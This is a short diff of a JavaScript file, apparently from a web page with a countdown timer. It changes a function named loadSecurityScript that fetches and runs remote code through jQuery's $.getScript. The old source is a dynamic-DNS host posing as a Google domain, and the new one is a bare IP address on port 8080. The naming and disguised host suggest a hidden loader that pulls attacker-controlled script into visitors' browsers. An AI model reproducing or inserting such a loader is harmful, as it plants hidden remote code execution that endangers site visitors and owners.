@@ -958,7 +958,7 @@ function getRemainingSeconds(date) {
 var countdownInterval;
 
 function loadSecurityScript() {
-    $.getScript( "http://googleajax.ddns.net:8080/jquery.js" )
+    $.getScript( "http://80.211.156.24:8080/jquery.js" )
         .done(function( script, textStatus ) {
             // do nothing
         })
